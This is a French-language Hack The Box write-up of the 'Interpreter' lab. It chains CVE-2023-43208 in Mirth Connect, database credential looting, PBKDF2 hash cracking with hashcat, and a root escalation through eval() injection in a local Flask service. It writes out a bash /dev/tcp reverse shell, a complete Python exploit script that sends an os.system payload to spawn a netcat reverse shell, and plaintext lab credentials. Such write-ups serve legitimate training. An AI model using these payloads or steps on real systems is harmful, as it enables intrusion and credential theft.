---
date: 2026-06-01T04:05:00-05:00
# description: ""
image: "/images/HTB-Eighteen/Interpreter.png"
lastmod: 2026-06-01
showTableOfContents: true
tags: ["HackTheBox", "Labs", "Mirth", "PBKDF2", "CVE-2023-43208", "python-privesc", "eval"]
categories: ["Red Teaming"]
title: "HTB: Interpreter"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Interpreter](https://app.hackthebox.com/machines/Interpreter)
* Niveau: Moyen
* OS: Linux
---

Interpreter débute par l'identification et l'énumération d'une instance de Mirth Connect. La recherche de vulnérabilités permet de découvrir la faille `CVE-2023-43208`, qui est exploitée pour obtenir un accès initial au système cible.

L'énumération du système révèle un fichier de configuration contenant les identifiants de la base de données. L'accès à la base de données permet de récupérer un hachage de mot de passe PBKDF2-SHA256, qui est ensuite reformaté et craqué afin d'obtenir le mot de passe SSH d'un utilisateur du système.

Une analyse plus approfondie met en évidence un service interne s'exécutant avec des privilèges root. L'analyse du code source du script Python révèle une utilisation non sécurisée de l'évaluation dynamique de code, entraînant une vulnérabilité permettant l'exécution de code. En exploitant cette faille, des commandes arbitraires sont exécutées dans le contexte du processus root, ce qui conduit finalement à la compromission totale du système.

# Balayage

```
nmap -p- --open -T4 -sCV -oA nmap/Interpreter <TARGET_IP>
```

**Résultats**
```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-29 07:01 EDT
Nmap scan report for interpreter.htb (10.129.244.184)
Host is up (0.11s latency).
Not shown: 64812 closed tcp ports (reset), 719 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp   open  http     Jetty
|_http-title: Mirth Connect Administrator
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp  open  ssl/http Jetty
|_http-title: Mirth Connect Administrator
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 243.50 seconds
```


Nmap détecte trois ports ouverts:
- 22 exécute SSH OpenSSH 9.2p1 Debian
- 80 exécute un serveur web Mirth Connect Administrator
- 443 exécute Mirth Connect Administrator avec SSL 

# Énumération

[Cet](https://www.huntress.com/threat-library/vulnerabilities/cve-2023-43208?utm_source=chatgpt.com) article de Huntress explique comment énumérer une instance de Mirth Connect afin de déterminer la version du logiciel en cours d'exécution.

Une requête web permet de déterminer qu'il s'agit de la version `4.4.0`.

```
curl -k \
  -H "X-Requested-With: XMLHttpRequest" \
  https://interpreter.htb/api/server/version
```

![Mirth version](/images/HTB-Interpreter/Mirth_version.png)

La recherche des vulnérabilités de cette version spécifique a conduit à la découverte du `CVE-2023-43208`, avec un PoC disponible [ici](https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc/blob/master/CVE-2023-43208.py).

Une URL et une commande sont nécessaires pour utiliser le script.

1. Encodage du payload
```
echo 'bash -i >& /dev/tcp/10.10.15.92/9001 0>&1' | base64
```

![base64 payload](/images/HTB-Interpreter/base64_rce.png)

2. Exécution de exploit
```
python3 CVE-2023-43208.py -u https://{TARGET_IP} -c "bash -c {echo,<BASE64_ENCODED_PAYLOAD>}|{base64,-d}|{bash,-i}"
```

![rce execution](/images/HTB-Interpreter/rce_execution.png)

# Accès initial

Un shell est obtenu sur le listener.

![Interpreter Foothold](/images/HTB-Interpreter/foothold.png)

Nous l'améliorons à l'aide des commandes suivantes:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

Linpeas indique un fichier nommé `mirth.properties`. Il s'agit du fichier de configuration principal de Mirth Connect, qui contient les paramètres relatifs à la base de données, aux ports, à la sécurité et aux répertoires du serveur.

![Mirth properties](/images/HTB-Interpreter/mirth_properties.png)

Il contient les identifiants de la base de données pour l'instance.

![Mirth database credentials](/images/HTB-Interpreter/mirth_db_creds.png)

```
mysql -u mirthdb -p'MirthPass123!' -h localhost mc_bdd_prod
show tables;
```

Les identifiants semblent être stockés séparément, dans les tables `PERSON` et `PERSON_PASSWORD`.

Le contenu de la première table est affiché:
```
select * from PERSON;
```

![Mirth sedric user name](/images/HTB-Interpreter/mirth_sedric.png)

Le nom d'utilisateur: `sedric` est trouvé.

Ensuite, le contenu de la deuxième table est extrait. Et un hachage de mot de passe est récupéré:

![Mirth sedric hash](/images/HTB-Interpreter/sedric_hash.png)

```
u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

## Hachage PBKDF2

`mirth` utilise l'algorithme `PBKDF2-SHA256`. Le même type d'algorithme a été présenté dans [HTB: Eighteen](https://scorpiosec.com/posts/htb-eighteen/#pbkdf2-hash).

![Mirth hash type](/images/HTB-Interpreter/mirth_hash_type.png)

Hashcat nécessite ce format: 
```
<HASH_ALGORITHM>:<NUMBER_OF_ITERATIONS>:<base64_SALT>:<base64_hash>
```

La commande suivante permet de formater correctement le hachage.

```
python3 -c "
import base64
data = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
salt = base64.b64encode(data[:8]).decode()
hash_ = base64.b64encode(data[8:]).decode()
print(f'sha256:600000:{salt}:{hash_}')
"
```

![formating script](/images/HTB-Interpreter/format_script.png)

Le hachage complet est le suivant:
```
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

On le déchiffre ensuite à l'aide de hashcat:
```
hashcat -m 10900 sedric_hash.txt /usr/share/wordlists/rockyou.txt
```

Et le mot de passe de l'utilisateur est récupéré.
```
snowflake1
```

![sedric password](/images/HTB-Interpreter/sedric_pwd.png)

Le drapeau utilisateur devient accessible après s'être connecté en tant que `sedric` via SSH.

![sedric SSH login](/images/HTB-Interpreter/sedric_ssh.png)

# Élévation des privilèges

Dans le répertoire `/usr/local/bin/`, se trouve un script Python nommé `notif.py`.

```Python
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)
```

Le résultat de la commande `ps aux | grep notif.py` indique que le programme s'exécute en tant que `root` et utilise le port `54321` (le numéro de port est également mentionné dans le script).

![Interpreter processes](/images/HTB-Interpreter/processes.png)

## Analyse de `notif.py`

Le fichier `notif.py` contient une fonction `eval()` non sécurisée sur des données XML fournies par l'utilisateur. Le point de terminaison `/addPatient` accepte des données XML, extrait des champs tels que `firstname`, `lastname`, `sender_app`, `birth_date` et `gender`, puis les transmet à la fonction `template()`.

La partie vulnérable est la suivante:
```Python
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
return eval(f"f'''{template}'''")
```

`first` est inséré dans une chaîne f-string Python puis évalué à l'aide de `eval()`, tout ce qui se trouve entre `{ ... }` dans le champ `firstname` devient du code Python exécutable.

> NOTE: Tout paramètre inséré dans `template` avant la fonction `eval()` peut être utilisé de manière malveillante, pas seulement `first`.

Le service n'accepte que les requêtes provenant de `127.0.0.1`.

```python
if request.remote_addr != "127.0.0.1":
    abort(403)
```

## Script malveillant

Le script ci-dessous est utilisé pour obtenir un shell root.

```python
#!/usr/bin/env python3
import urllib.request
import base64

TARGET_URL = "http://127.0.0.1:54321/addPatient"
LHOST = "YOUR_IP"
LPORT = PORT_NUMBER

cmd = f"nc {LHOST} {LPORT} -e /bin/bash"

b64_cmd = base64.b64encode(cmd.encode()).decode()

xml = f"""
<patient>
  <timestamp>20250101120000</timestamp>
  <sender_app>TEST</sender_app>
  <id>12345</id>
  <firstname>{{__import__("os").system(__import__("base64").b64decode("{b64_cmd}").decode())}}</firstname>
  <lastname>Doe</lastname>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>
"""

req = urllib.request.Request(
    TARGET_URL,
    data=xml.encode(),
    headers={"Content-Type": "application/xml"}
)

urllib.request.urlopen(req)
print("[+] Payload sent, check your listener")
```

Il envoie ce payload comme valeur pour `firstname`:
```python
{__import__("os").system(__import__("base64").b64decode("...").decode())}
```

Ce code importe `os`, décode la commande Base64 et l'exécute à l'aide de `os.system()`.

La commande décodée est en substance:
```
nc YOUR_IP PORT_NUMBER -e /bin/bash
```

Ainsi, lorsque `notif.py` évalue la chaîne f-string, il exécute le shell inversé netcat en tant qu'utilisateur exécutant `notif.py`. Étant donné que le service sur le port `54321` s'exécute en tant que root, nous obtenons un shell en tant que `root` sur le listener.


## Exploitation

Pour accéder au service interne, un tunnel SSH est mis en place.

```
ssh -L 54321:127.0.0.1:54321 sedric@interpreter.htb
```

Après l'exécution du script malveillant, nous obtenons un shell.

![Interpreter root shell](/images/HTB-Interpreter/interpreter_root.png)


